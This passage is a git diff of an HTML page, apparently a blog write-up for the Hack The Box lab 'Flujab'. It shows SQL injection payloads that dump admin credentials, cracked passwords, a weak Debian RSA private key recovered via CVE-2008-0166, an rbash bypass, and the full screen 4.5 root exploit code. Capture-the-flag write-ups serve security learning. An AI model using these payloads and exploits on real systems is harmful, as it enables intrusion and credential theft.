 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc' and column_name!='email'--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
 </code></pre></div></div>
-<h4 id="smtp--7"><code class="highlighter-rouge">smtp</code> :</h4>
-<p><img src="/images/hackthebox/flujab/74.png" alt="" /></p>
+<p><br /> <code class="highlighter-rouge">smtp</code> :
+<img src="/images/hackthebox/flujab/74.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
 Date: Thu, 13 Jun 2019 15:48:47 +0100
 To: cancelations@no-reply.flujab.htb
@@ -755,13 +758,13 @@ X-Peer: 10.10.10.124
 
 ------------ END MESSAGE ------------
 </code></pre></div></div>
-<h4 id="fifth-column--access">Fifth column : <code class="highlighter-rouge">access</code></h4>
-<h4 id="i-stopped-right-there-to-see-if-thats-enough-lets-see-what-data-can-we-get-from-these-columns">I stopped right there to see if that’s enough, let’s see what data can we get from these columns.</h4>
-<p><img src="/images/hackthebox/flujab/75.png" alt="" /></p>
+<p><br /> Fifth column : <code class="highlighter-rouge">access</code>
+<br /> I stopped right there to see if that’s enough, let’s see what data can we get from these columns.
+<img src="/images/hackthebox/flujab/75.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nhsnum=' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',email,':',access),4,5 FROM admin#&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
 </code></pre></div></div>
-<h4 id="smtp--8"><code class="highlighter-rouge">smtp</code> :</h4>
-<p><img src="/images/hackthebox/flujab/76.png" alt="" /></p>
+<p><br /> <code class="highlighter-rouge">smtp</code> :
+<img src="/images/hackthebox/flujab/76.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
 Date: Thu, 13 Jun 2019 16:01:53 +0100
 To: cancelations@no-reply.flujab.htb
@@ -797,12 +800,12 @@ X-Peer: 10.10.10.124
 
 ------------ END MESSAGE ------------
 </code></pre></div></div>
-<h4 id="we-got-a-login-name-an-email-address-and-a-link-to-a-sysadmin-console-but-we-still-need-a-password-i-dont-know-if-i-had-to-enumerate-more-until-i-get-the-column-password-but-anyway-i-just-added-password-hoping-that-theres-a-column-called-password-and-i-was-right-">We got a login name, an email address and a link to a sysadmin console. But we still need a password. I don’t know if I had to enumerate more until I get the column <code class="highlighter-rouge">password</code> but anyway I just added password hoping that there’s a column called password, and I was right :</h4>
-<p><img src="/images/hackthebox/flujab/77.png" alt="" /></p>
+<p><br /> We got a login name, an email address and a link to a sysadmin console. But we still need a password. I don’t know if I had to enumerate more until I get the column <code class="highlighter-rouge">password</code> but anyway I just added password hoping that there’s a column called password, and I was right :
+<img src="/images/hackthebox/flujab/77.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nhsnum=' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',password,':',email,':',access),4,5 FROM admin#&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
 </code></pre></div></div>
-<h4 id="smtp--9"><code class="highlighter-rouge">smtp</code> :</h4>
-<p><img src="/images/hackthebox/flujab/78.png" alt="" /></p>
+<p><br /> <code class="highlighter-rouge">smtp</code> :
+<img src="/images/hackthebox/flujab/78.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
 Date: Thu, 13 Jun 2019 16:03:22 +0100
 To: cancelations@no-reply.flujab.htb
@@ -838,50 +841,50 @@ X-Peer: 10.10.10.124
 
 ------------ END MESSAGE ------------
 </code></pre></div></div>
-<h4 id="lets-take-a-look-at-what-we-have-">let’s take a look at what we have :</h4>
-<p><img src="/images/hackthebox/flujab/79.png" alt="" /></p>
-<h4 id="password-is-a-sha256-hash-i-used-crackstation-to-crack-it-">Password is a <code class="highlighter-rouge">sha256</code> hash. I used <a href="https://crackstation.net/">crackstation</a> to crack it :</h4>
-<p><img src="/images/hackthebox/flujab/80.png" alt="" /></p>
-<h4 id="password--th3doct0r">Password : <code class="highlighter-rouge">th3doct0r</code></h4>
-<h4 id="i-added-sysadmin-console-01flujabhtb-to-etchosts-then-i-went-to-httpsysadmin-console-01flujabhtb-">I added <code class="highlighter-rouge">sysadmin-console-01.flujab.htb</code> to <code class="highlighter-rouge">/etc/hosts</code> then I went to <code class="highlighter-rouge">http://sysadmin-console-01.flujab.htb/</code> :</h4>
-<p><img src="/images/hackthebox/flujab/81.png" alt="" />
+<p><br /> let’s take a look at what we have :
+<img src="/images/hackthebox/flujab/79.png" alt="" />
+<br /> Password is a <code class="highlighter-rouge">sha256</code> hash. I used <a href="https://crackstation.net/">crackstation</a> to crack it :
+<img src="/images/hackthebox/flujab/80.png" alt="" />
+<br /> Password : <code class="highlighter-rouge">th3doct0r</code>
+<br /> I added <code class="highlighter-rouge">sysadmin-console-01.flujab.htb</code> to <code class="highlighter-rouge">/etc/hosts</code> then I went to <code class="highlighter-rouge">http://sysadmin-console-01.flujab.htb/</code> :
+<img src="/images/hackthebox/flujab/81.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/82.png" alt="" /></p>
-<h4 id="i-got-the-direct-ip-access-error-again-but-this-time-on-port-8080-i-didnt-get-the-same-error-">I got the direct ip access error again. But this time on port 8080 I didn’t get the same error :</h4>
-<p><img src="/images/hackthebox/flujab/83.png" alt="" />
+<img src="/images/hackthebox/flujab/82.png" alt="" />
+<br /> I got the direct ip access error again. But this time on port 8080 I didn’t get the same error :
+<img src="/images/hackthebox/flujab/83.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/84.png" alt="" /></p>
-<h4 id="ajenti-administration-panel-note--it-wont-be-accessible-if-your-ip-wasnt-in-the-whitelist"><code class="highlighter-rouge">Ajenti</code> administration panel. (Note : It won’t be accessible if your ip wasn’t in the whitelist)</h4>
-<p><br /></p>
+<img src="/images/hackthebox/flujab/84.png" alt="" />
+<br /> <code class="highlighter-rouge">Ajenti</code> administration panel. (Note : It won’t be accessible if your ip wasn’t in the whitelist)
+<br /></p>
 <hr />
 
-<h3 id="cve-2008-0166-user-flag">CVE-2008-0166, User Flag</h3>
-<h4 id="after-getting-in-the-first-thing-i-noticed-was-the-notepad-">After getting in the first thing I noticed was the notepad :</h4>
-<p><img src="/images/hackthebox/flujab/85.png" alt="" />
+<h2 id="cve-2008-0166-user-flag">CVE-2008-0166, User Flag</h2>
+<p><br /> After getting in the first thing I noticed was the notepad :
+<img src="/images/hackthebox/flujab/85.png" alt="" />
 <br />
 <br />
 <img src="/images/hackthebox/flujab/86.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/87.png" alt="" /></p>
-<h4 id="nice-so-we-can-read-and-write-some-stuff-on-the-server-i-checked-the-home-directory-and-it-had-a-lot-of-users-with-a-lot-of-user-flags-">Nice so we can read and write some stuff on the server. I checked the home directory and it had a lot of users with a lot of user flags ….</h4>
-<p><img src="/images/hackthebox/flujab/88.png" alt="" /></p>
-<h4 id="for-example-">For example :</h4>
-<p><img src="/images/hackthebox/flujab/89.png" alt="" />
+<img src="/images/hackthebox/flujab/87.png" alt="" />
+<br /> Nice so we can read and write some stuff on the server. I checked the home directory and it had a lot of users with a lot of user flags ….
+<img src="/images/hackthebox/flujab/88.png" alt="" />
+<br /> For example :
+<img src="/images/hackthebox/flujab/89.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/90.png" alt="" /></p>
-<h4 id="but-one-user-called-drno-had-ssh-directory-with-a-key-in-it">But one user called <code class="highlighter-rouge">drno</code> had <code class="highlighter-rouge">.ssh</code> directory with a key in it.</h4>
-<p><img src="/images/hackthebox/flujab/91.png" alt="" />
+<img src="/images/hackthebox/flujab/90.png" alt="" />
+<br /> But one user called <code class="highlighter-rouge">drno</code> had <code class="highlighter-rouge">.ssh</code> directory with a key in it. 
+<img src="/images/hackthebox/flujab/91.png" alt="" />
 <br />
 <br />
 <img src="/images/hackthebox/flujab/92.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/93.png" alt="" /></p>
-<h4 id="userkey-"><code class="highlighter-rouge">userkey</code> :</h4>
+<img src="/images/hackthebox/flujab/93.png" alt="" />
+<br /> <code class="highlighter-rouge">userkey</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,6F8D2ABE85DA1FE16846D997BD04E40B
@@ -913,36 +916,36 @@ LSLiIuex63EKHhEdZISPsG9/cMBSckZ/oh86TQuZVagkXcQpIpNKEWwIv4yJIbji
 ISRFtN80+FMrhQf/+CLpoK5RHRNXNq38ztg2GJVPiTN0rN+3Vk0ZI6PeZVuHzW7r
 -----END RSA PRIVATE KEY-----
 </code></pre></div></div>
-<h4 id="unfortunately-it-was-encrypted-so-i-used-ssh2john-then-i-cracked-it-">Unfortunately it was encrypted so I used <code class="highlighter-rouge">ssh2john</code> then I cracked it :</h4>
-<p><img src="/images/hackthebox/flujab/94.png" alt="" />
+<p><br /> Unfortunately it was encrypted so I used <code class="highlighter-rouge">ssh2john</code> then I cracked it :
+<img src="/images/hackthebox/flujab/94.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/95.png" alt="" /></p>
-<h4 id="password--shadowtroll">Password : <code class="highlighter-rouge">shadowtroll</code></h4>
-<h4 id="chmod-600-drnokey-then-i-used-the-key-to-ssh-as-drno-and-we-got-the-user-flag-"><code class="highlighter-rouge">chmod 600 drno.key</code>, then I used the key to ssh as <code class="highlighter-rouge">drno</code> and we got the user flag :</h4>
-<p><img src="/images/hackthebox/flujab/96.png" alt="" /></p>
-<h4 id="nope-we-only-got-a-connection-reset-i-went-back-to-the-administration-panel-and-took-a-look-at-etchostsallow-">Nope we only got a connection reset. I went back to the administration panel and took a look at <code class="highlighter-rouge">/etc/hosts.allow</code> :</h4>
-<p><img src="/images/hackthebox/flujab/97.png" alt="" /></p>
-<h4 id="i-added-my-ip-address-and-tried-again-">I added my ip address and tried again :</h4>
-<p><img src="/images/hackthebox/flujab/98.png" alt="" />
+<img src="/images/hackthebox/flujab/95.png" alt="" />
+<br /> Password : <code class="highlighter-rouge">shadowtroll</code>
+<br /> <code class="highlighter-rouge">chmod 600 drno.key</code>, then I used the key to ssh as <code class="highlighter-rouge">drno</code> and we got the user flag :
+<img src="/images/hackthebox/flujab/96.png" alt="" />
+<br /> Nope we only got a connection reset. I went back to the administration panel and took a look at <code class="highlighter-rouge">/etc/hosts.allow</code> :
+<img src="/images/hackthebox/flujab/97.png" alt="" />
+<br /> I added my ip address and tried again :
+<img src="/images/hackthebox/flujab/98.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/99.png" alt="" /></p>
-<h4 id="still-a-connection-reset-i-went-back-and-added-sshd--all">Still a connection reset. I went back and added <code class="highlighter-rouge">sshd : ALL</code></h4>
-<p><img src="/images/hackthebox/flujab/100.png" alt="" />
+<img src="/images/hackthebox/flujab/99.png" alt="" />
+<br /> Still a connection reset. I went back and added <code class="highlighter-rouge">sshd : ALL</code>
+<img src="/images/hackthebox/flujab/100.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/101.png" alt="" /></p>
-<h4 id="it-worked-but-now-it-doesnt-accept-the-key-it-was-just-a-troll-anyway-we-got-the-public-key-in-authorized_keys-">It worked but now it doesn’t accept the key. It was just a troll. Anyway we got the public key in <code class="highlighter-rouge">authorized_keys</code> :</h4>
-<p><img src="/images/hackthebox/flujab/102.png" alt="" /></p>
+<img src="/images/hackthebox/flujab/101.png" alt="" />
+<br /> It worked but now it doesn’t accept the key. It was just a troll. Anyway we got the public key in <code class="highlighter-rouge">authorized_keys</code> :
+<img src="/images/hackthebox/flujab/102.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># shell whitelisting + key auth enabled 
 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE=
 </code></pre></div></div>
-<h4 id="i-tried-cve-2008-0166-i-downloaded-the-files-from-here-then-i-extracted-them-in-a-directory-called-cve-2008-0166-then-i-used-grep-to-search-for-the-last-line-in-the-public-key--yv8c1uai3lunrsh9rxfnox1rtz73ucmgtbacomvqy9mpi96rizm2qbe26v1mxiqnktu03cbne8tdd96txonmaxe-through-all-files-">I tried <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166"><code class="highlighter-rouge">CVE-2008-0166</code></a>. I downloaded the files from <a href="https://github.com/g0tmi1k/debian-ssh">here</a> then I extracted them in a directory called <code class="highlighter-rouge">cve-2008-0166</code>. Then I used <code class="highlighter-rouge">grep</code> to search for the last line in the public key : <code class="highlighter-rouge">Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE</code> through all files :</h4>
-<p><code class="highlighter-rouge">grep -r -n "Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE" cve-2008-0166/*</code>
-<img src="/images/hackthebox/flujab/103.png" alt="" /></p>
-<h4 id="it-matched-this-public-key--debian_ssh_rsa_4096_x86rsa4096dead0b5b829ea2e3d22f47a7cbde17a6-23269pub-so-i-grabbed-the-private-key--dead0b5b829ea2e3d22f47a7cbde17a6-23269-and-used-it-to-get-ssh">It matched this public key : <code class="highlighter-rouge">debian_ssh_rsa_4096_x86/rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269.pub</code> so I grabbed the private key : <code class="highlighter-rouge">dead0b5b829ea2e3d22f47a7cbde17a6-23269</code> and used it to get ssh.</h4>
-<h4 id="dead0b5b829ea2e3d22f47a7cbde17a6-23269-"><code class="highlighter-rouge">dead0b5b829ea2e3d22f47a7cbde17a6-23269</code> :</h4>
+<p><br /> I tried <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166"><code class="highlighter-rouge">CVE-2008-0166</code></a>. I downloaded the files from <a href="https://github.com/g0tmi1k/debian-ssh">here</a> then I extracted them in a directory called <code class="highlighter-rouge">cve-2008-0166</code>. Then I used <code class="highlighter-rouge">grep</code> to search for the last line in the public key : <code class="highlighter-rouge">Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE</code> through all files :
+<code class="highlighter-rouge">grep -r -n "Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE" cve-2008-0166/*</code>
+<img src="/images/hackthebox/flujab/103.png" alt="" />
+<br /> It matched this public key : <code class="highlighter-rouge">debian_ssh_rsa_4096_x86/rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269.pub</code> so I grabbed the private key : <code class="highlighter-rouge">dead0b5b829ea2e3d22f47a7cbde17a6-23269</code> and used it to get ssh. 
+<br /> <code class="highlighter-rouge">dead0b5b829ea2e3d22f47a7cbde17a6-23269</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN RSA PRIVATE KEY-----
 MIIJJgIBAAKCAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg
 2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SH
@@ -995,33 +998,33 @@ YmV/Y0t4jAp2NsVstNSEPx77r9FxC6ItXiX2lamTtZiGZvREN3vrSujKwpBhKYlc
 uUZN5cXjMY84Yz0Rau5+oaio9ldLJUGB1/DUYlvosjazQUjKYBK/eV3n
 -----END RSA PRIVATE KEY-----
 </code></pre></div></div>
-<p><img src="/images/hackthebox/flujab/104.png" alt="" /></p>
-<h4 id="we-owned-user-">We owned user !</h4>
-<p><br /></p>
+<p><img src="/images/hackthebox/flujab/104.png" alt="" />
+<br /> We owned user !
+<br /></p>
 <hr />
 
-<h3 id="bypassing-restricted-bash-local-privilege-escalation-vulnerability-in-screen-root-flag">Bypassing restricted bash, Local Privilege Escalation Vulnerability in screen, Root Flag</h3>
-<h4 id="after-getting-ssh-access-i-found-myself-in-rbash-">After getting ssh access I found myself in <code class="highlighter-rouge">rbash</code> :</h4>
-<p><img src="/images/hackthebox/flujab/105.png" alt="" /></p>
-<h4 id="after-trying-some-stuff-i-could-bypass-it-by-adding-the--t-option-when-trying-to-ssh-">After trying some stuff I could bypass it by adding the <code class="highlighter-rouge">-t</code> option when trying to ssh :</h4>
-<p><code class="highlighter-rouge">ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@flujab.htb -t "bash --noprofile"</code>
-<img src="/images/hackthebox/flujab/106.png" alt="" /></p>
-<h4 id="then-i-had-to-fix-my-path-">Then I had to fix my path :</h4>
-<p><code class="highlighter-rouge">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</code>
-<img src="/images/hackthebox/flujab/107.png" alt="" /></p>
-<h4 id="i-did-some-regular-enumeration-steps-one-of-them-is-searching-for-suid-binaries-">I did some regular enumeration steps, one of them is searching for <code class="highlighter-rouge">suid</code> binaries :</h4>
-<p><code class="highlighter-rouge">find / -perm -4000 2&gt;/dev/null</code>
-<img src="/images/hackthebox/flujab/108.png" alt="" /></p>
-<h4 id="one-thing-that-caught-my-attention-was-usrlocalsharescreenscreen">One thing that caught my attention was <code class="highlighter-rouge">/usr/local/share/screen/screen</code></h4>
-<h4 id="i-checked-the-version-of-screen-">I checked the version of <code class="highlighter-rouge">screen</code> :</h4>
-<p><code class="highlighter-rouge">screen -v</code> :
-<img src="/images/hackthebox/flujab/109.png" alt="" /></p>
-<h4 id="it-was-version-45-which-is-vulnerable-to-a-local-privilege-escalation-vulnerability-and-theres-a-published-exploit-for-it-here-however-by-looking-at-that-exploit-">It was version 4.5 which is vulnerable to a Local Privilege Escalation Vulnerability and there’s a published exploit for it <a href="https://www.exploit-db.com/exploits/41154">here</a>. However by looking at that exploit :</h4>
-<p><img src="/images/hackthebox/flujab/110.png" alt="" /></p>
-<h4 id="we-can-see-that-its-compiling-stuff-and-unfortunately-gcc-wasnt-installed-on-the-machine-">We can see that it’s compiling stuff. And unfortunately <code class="highlighter-rouge">gcc</code> wasn’t installed on the machine :</h4>
-<p><img src="/images/hackthebox/flujab/111.png" alt="" /></p>
-<h4 id="so-i-had-to-remove-the-c-code-from-the-exploit-and-create-separate-files-then-i-compiled-them">So I had to remove the <code class="highlighter-rouge">c</code> code from the exploit and create separate files. Then I compiled them.</h4>
-<h4 id="libhaxc-"><code class="highlighter-rouge">libhax.c</code> :</h4>
+<h2 id="bypassing-restricted-bash-local-privilege-escalation-vulnerability-in-screen-root-flag">Bypassing restricted bash, Local Privilege Escalation Vulnerability in screen, Root Flag</h2>
+<p><br /> After getting ssh access I found myself in <code class="highlighter-rouge">rbash</code> :
+<img src="/images/hackthebox/flujab/105.png" alt="" />
+<br /> After trying some stuff I could bypass it by adding the <code class="highlighter-rouge">-t</code> option when trying to ssh :
+<code class="highlighter-rouge">ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@flujab.htb -t "bash --noprofile"</code>
+<img src="/images/hackthebox/flujab/106.png" alt="" />
+<br /> Then I had to fix my path :
+<code class="highlighter-rouge">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</code>
+<img src="/images/hackthebox/flujab/107.png" alt="" />
+<br /> I did some regular enumeration steps, one of them is searching for <code class="highlighter-rouge">suid</code> binaries :
+<code class="highlighter-rouge">find / -perm -4000 2&gt;/dev/null</code>
+<img src="/images/hackthebox/flujab/108.png" alt="" />
+<br /> One thing that caught my attention was <code class="highlighter-rouge">/usr/local/share/screen/screen</code>
+<br /> I checked the version of <code class="highlighter-rouge">screen</code> :
+<code class="highlighter-rouge">screen -v</code> :
+<img src="/images/hackthebox/flujab/109.png" alt="" />
+<br /> It was version 4.5 which is vulnerable to a Local Privilege Escalation Vulnerability and there’s a published exploit for it <a href="https://www.exploit-db.com/exploits/41154">here</a>. However by looking at that exploit :
+<img src="/images/hackthebox/flujab/110.png" alt="" />
+<br /> We can see that it’s compiling stuff. And unfortunately <code class="highlighter-rouge">gcc</code> wasn’t installed on the machine :
+<img src="/images/hackthebox/flujab/111.png" alt="" />
+<br /> So I had to remove the <code class="highlighter-rouge">c</code> code from the exploit and create separate files. Then I compiled them.
+<br /> <code class="highlighter-rouge">libhax.c</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
 #include &lt;sys/types.h&gt;
 #include &lt;unistd.h&gt;
@@ -1033,7 +1036,7 @@ void dropshell(void){
     printf("[+] done!\n");
 }
 </code></pre></div></div>
-<h4 id="rootshellc-"><code class="highlighter-rouge">rootshell.c</code> :</h4>
+<p><br /> <code class="highlighter-rouge">rootshell.c</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
 int main(void){
     setuid(0);
@@ -1043,11 +1046,11 @@ int main(void){
     execvp("/bin/sh", NULL, NULL);
 }
 </code></pre></div></div>
-<h4 id="compilation-">Compilation :</h4>
-<p><code class="highlighter-rouge">gcc -fPIC -shared -ldl -o libhax.so libhax.c</code>
+<p><br /> Compilation :
+<code class="highlighter-rouge">gcc -fPIC -shared -ldl -o libhax.so libhax.c</code>
 <br />
-<code class="highlighter-rouge">gcc -o rootshell rootshell.c</code></p>
-<h4 id="exploitsh-"><code class="highlighter-rouge">exploit.sh</code> :</h4>
+<code class="highlighter-rouge">gcc -o rootshell rootshell.c</code>
+<br /> <code class="highlighter-rouge">exploit.sh</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash </span>
 <span class="nb">cd</span> /etc
 <span class="nb">umask </span>000
@@ -1056,14 +1059,14 @@ screen <span class="nt">-D</span> <span class="nt">-m</span> <span class="nt">-L
 screen <span class="nt">-ls</span> 
 /tmp/rootshell
 </code></pre></div></div>
-<h4 id="i-ran-a-python-server-to-host-the-compiled-binaries-and-the-exploit-script-then-i-downloaded-them-on-the-machine-">I ran a python server to host the compiled binaries and the exploit script. Then I downloaded them on the machine :</h4>
-<p><img src="/images/hackthebox/flujab/112.png" alt="" /></p>
-<h4 id="but-when-i-ran-the-exploit-it-didnt-spawn-a-root-shell-">But when I ran the exploit it didn’t spawn a root shell :</h4>
-<p><img src="/images/hackthebox/flujab/113.png" alt="" /></p>
-<h4 id="thats-because-i-forgot-that-the-suid-version-of-screen-was-in-usrlocalsharescreenscreen-the-other-one-had-problems-and-didnt-even-start-">That’s because I forgot that the <code class="highlighter-rouge">suid</code> version of <code class="highlighter-rouge">screen</code> was in <code class="highlighter-rouge">/usr/local/share/screen/screen</code>. The other one had problems and didn’t even start :</h4>
-<p><img src="/images/hackthebox/flujab/114.png" alt="" /></p>
-<h4 id="so-i-edited-the-path-in-the-exploit-code-">So I edited the path in the exploit code :</h4>
-<p><img src="/images/hackthebox/flujab/115.png" alt="" /></p>
+<p><br /> I ran a python server to host the compiled binaries and the exploit script. Then I downloaded them on the machine :
+<img src="/images/hackthebox/flujab/112.png" alt="" />
+<br /> But when I ran the exploit it didn’t spawn a root shell :
+<img src="/images/hackthebox/flujab/113.png" alt="" />
+<br /> That’s because I forgot that the <code class="highlighter-rouge">suid</code> version of <code class="highlighter-rouge">screen</code> was in <code class="highlighter-rouge">/usr/local/share/screen/screen</code>. The other one had problems and didn’t even start :
+<img src="/images/hackthebox/flujab/114.png" alt="" />
+<br /> So I edited the path in the exploit code :
+<img src="/images/hackthebox/flujab/115.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash </span>
 <span class="nb">cd</span> /etc
 <span class="nb">umask </span>000
@@ -1072,48 +1075,145 @@ screen <span class="nt">-ls</span>
 /usr/local/share/screen/screen <span class="nt">-ls</span> 
 /tmp/rootshell
 </code></pre></div></div>
-<p><img src="/images/hackthebox/flujab/116.png" alt="" /></p>
-<h4 id="and-we-owned-root-">And we owned root !</h4>
-<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
-<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
-<h4 id="thanks-for-reading">Thanks for reading.</h4>
-<p><br />
-<br /></p>
-<h4 id="previous-hack-the-box-write-up--hack-the-box---help">Previous Hack The Box write-up : <a href="/hack-the-box/help/">Hack The Box - Help</a></h4>
-<h4 id="next-hack-the-box-write-up--hack-the-box---querier">Next Hack The Box write-up : <a href="/hack-the-box/querier/">Hack The Box - Querier</a></h4>
+<p><img src="/images/hackthebox/flujab/116.png" alt="" />
+<br /> And we owned root !
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/help/">Hack The Box - Help</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/querier/">Hack The Box - Querier</a></p>
 <hr />
 
 
-  </div>
-<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/flujab/" hidden></a>
-</article>
-
-      </div>
-    </main><footer class="site-footer h-card">
-  <data class="u-url" href="/"></data>
-
-  <div class="wrapper">
-
-    <h2 class="footer-heading">0xRick Owned Root !</h2>
-
-    <div class="footer-col-wrapper">
-      <div class="footer-col footer-col-1">
-        <ul class="contact-list">
-          <li class="p-name">0xRick Owned Root !</li></ul>
-      </div>
-
-      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
 </div>
 
-      <div class="footer-col footer-col-3">
-        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+
+
+
+
+<div class="related">
+  <h2>other posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/pwn/collision/">
+            pwnable.kr - collision
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/unattended/">
+            Hack The Box - Unattended
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/helpline/">
+            Hack The Box - Helpline
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
